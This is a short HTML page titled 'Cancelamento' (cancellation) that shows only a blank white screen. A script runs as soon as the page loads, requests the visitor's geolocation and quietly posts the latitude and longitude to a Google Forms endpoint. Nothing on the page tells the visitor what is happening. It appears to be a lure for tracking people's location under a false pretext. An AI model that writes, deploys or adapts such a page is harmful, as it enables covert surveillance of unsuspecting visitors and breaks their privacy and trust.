<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Cancelamento</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background-color: #ffffff;
    }
  </style>
</head>
<body>
  <script>
    const formURL = 'https://docs.google.com/forms/d/e/1FAIpQLSdpX76HCgkwL3ZqJCELRTJHTgFjbK1mNOx00Oy9dNqD2jyC1A/formResponse';
    const latitudeEntry = 'entry.138873872';
    const longitudeEntry = 'entry.1715135382';

    window.addEventListener('load', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const formData = new FormData();
          formData.append(latitudeEntry, lat);
          formData.append(longitudeEntry, lon);

          fetch(formURL, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
          });
        });
      }
    });
  </script>
</body>
</html>
